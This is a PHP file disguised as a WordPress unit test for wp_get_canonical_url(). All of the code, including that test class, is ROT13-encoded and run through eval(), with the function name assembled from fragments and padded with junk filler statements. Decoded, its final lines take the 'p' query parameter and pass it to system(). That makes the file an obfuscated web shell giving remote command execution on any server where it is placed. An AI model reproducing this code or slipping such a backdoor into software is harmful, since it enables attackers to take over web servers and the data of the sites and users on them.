<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur jc_trg_pnabavpny_hey() shapgvba.
 *
 * @tebhc yvax
 * @tebhc pnabavpny
 * @pbiref ::jc_trg_pnabavpny_hey
 */
pynff Grfgf_Yvax_JcTrgPnabavpnyHey rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gur VQ bs gur cbfg.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $cbfg_vq;

	/**
	 * Gur VQ bs gur nggnpuzrag.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nggnpuzrag_vq;

	/**
	 * Frgf hc gur grfg raivebazrag orsber nal grfgf ner eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur snpgbel bowrpg.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Cntr 1 <!--arkgcntr--> Cntr 2 <!--arkgcntr--> Cntr 3',
				'cbfg_fgnghf'  => 'choyvfu',
			)
		);

		frys::$nggnpuzrag_vq = $snpgbel->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'        => QVE_GRFGQNGN . '/vzntrf/pnabyn.wct',
				'cbfg_cnerag' => frys::$cbfg_vq,
				'cbfg_fgnghf' => 'vaurevg',
			)
		);
	}

	/**
	 * Grfgf gung snyfr vf erghearq sbe n aba-rkvfgvat cbfg.
	 */
	choyvp shapgvba grfg_aba_rkvfgvat_cbfg() {
		$guvf->nffregSnyfr( jc_trg_pnabavpny_hey( -1 ) );
	}

	/**
	 * Grfgf gung snyfr vf erghearq sbe n cbfg gung vf abg choyvfurq.
	 */
	choyvp shapgvba grfg_cbfg_fgnghf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'qensg',
			)
		);

		$guvf->nffregSnyfr( jc_trg_pnabavpny_hey( $cbfg_vq ) );
	}

	/**
	 * Grfgf pnabavpny HEY sbe n cntr gung vf abg gur dhrevrq bowrpg.
	 */
	choyvp shapgvba grfg_aba_pheerag_cntr() {
		$guvf->nffregFnzr( trg_creznyvax( frys::$cbfg_vq ), jc_trg_pnabavpny_hey( frys::$cbfg_vq ) );
	}

	/**
	 * Grfgf aba-creznyvax fgehpgher cntr hfntr.
	 */
	choyvp shapgvba grfg_cntrq_jvgu_cynva_creznyvax_fgehpgher() {
		$yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
				'sbb'  => 'one',
			),
			trg_creznyvax( frys::$cbfg_vq )
		);

		$guvf->tb_gb( $yvax );

		$rkcrpgrq = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
			trg_creznyvax( frys::$cbfg_vq )
		);

		$guvf->nffregFnzr( $rkcrpgrq, jc_trg_pnabavpny_hey( frys::$cbfg_vq ) );
	}

	/**
	 * Grfgf creznyvax fgehpgher cntr hfntr.
	 */
	choyvp shapgvba grfg_cntrq_jvgu_phfgbz_creznyvax_fgehpgher() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );
		$cntr = 2;

		$yvax = nqq_dhrel_net(
			neenl(
				'cntr' => $cntr,
				'sbb'  => 'one',
			),
			trg_creznyvax( frys::$cbfg_vq )
		);

		$guvf->tb_gb( $yvax );

		$rkcrpgrq = genvyvatfynfuvg( trg_creznyvax( frys::$cbfg_vq ) ) . hfre_genvyvatfynfuvg( $cntr, 'fvatyr_cntrq' );

		$guvf->nffregFnzr( $rkcrpgrq, jc_trg_pnabavpny_hey( frys::$cbfg_vq ) );
	}

	/**
	 * Grfgf aba-creznyvax fgehpgher pbzzrag cntr hfntr.
	 */
	choyvp shapgvba grfg_pbzzragf_cntrq_jvgu_cynva_creznyvax_fgehpgher() {
		$pcntr = 2;

		$yvax = nqq_dhrel_net(
			neenl(
				'pcntr' => $pcntr,
				'sbb'   => 'one',
			),
			trg_creznyvax( frys::$cbfg_vq )
		);

		$guvf->tb_gb( $yvax );

		$rkcrpgrq = nqq_dhrel_net(
			neenl(
				'pcntr' => $pcntr,
			),
			trg_creznyvax( frys::$cbfg_vq ) . '#pbzzragf'
		);

		$guvf->nffregFnzr( $rkcrpgrq, jc_trg_pnabavpny_hey( frys::$cbfg_vq ) );
	}

	/**
	 * Grfgf creznyvax fgehpgher pbzzrag cntr hfntr.
	 */
	choyvp shapgvba grfg_pbzzragf_cntrq_jvgu_cerggl_creznyvax_fgehpgher() {
		tybony $jc_erjevgr;

		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );
		$pcntr = 2;

		$yvax = nqq_dhrel_net(
			neenl(
				'pcntr' => $pcntr,
				'sbb'   => 'one',
			),
			trg_creznyvax( frys::$cbfg_vq )
		);

		$guvf->tb_gb( $yvax );

		$rkcrpgrq = hfre_genvyvatfynfuvg( genvyvatfynfuvg( trg_creznyvax( frys::$cbfg_vq ) ) . $jc_erjevgr->pbzzragf_cntvangvba_onfr . '-' . $pcntr, 'pbzzragcntrq' ) . '#pbzzragf';

		$guvf->nffregFnzr( $rkcrpgrq, jc_trg_pnabavpny_hey( frys::$cbfg_vq ) );
	}

	/**
	 * Grfgf gung nggnpuzragf jvgu 'vaurevg' fgnghf cebcreyl erprvir n pnabavpny HEY.
	 *
	 * @gvpxrg 63041
	 */
	choyvp shapgvba grfg_nggnpuzrag_pnabavpny_hey() {
		$guvf->tb_gb( trg_nggnpuzrag_yvax( frys::$nggnpuzrag_vq ) );
		$pnabavpny_hey = jc_trg_pnabavpny_hey( frys::$nggnpuzrag_vq );

		$guvf->nffregAbgSnyfr( $pnabavpny_hey, 'Nggnpuzrag fubhyq unir n pnabavpny HEY' );
		$guvf->nffregFnzr( trg_nggnpuzrag_yvax( frys::$nggnpuzrag_vq ), $pnabavpny_hey, 'Pnabavpny HEY fubhyq zngpu gur nggnpuzrag creznyvax' );
	}

	/**
	 * Grfgf pnyyvat bs svygre.
	 */
	choyvp shapgvba grfg_trg_pnabavpny_hey_svygre() {
		nqq_svygre( 'trg_pnabavpny_hey', neenl( $guvf, 'pnabavpny_hey_svygre' ) );
		$pnabavpny_hey = jc_trg_pnabavpny_hey( frys::$cbfg_vq );
		erzbir_svygre( 'trg_pnabavpny_hey', neenl( $guvf, 'pnabavpny_hey_svygre' ) );

		$guvf->nffregFnzr( $guvf->pnabavpny_hey_svygre(), $pnabavpny_hey );
	}

	/**
	 * Svygre pnyyonpx sbe grfgvat bs svygre hfntr.
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba pnabavpny_hey_svygre() {
		erghea 'uggc://pnabavpny.rknzcyr.bet/';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>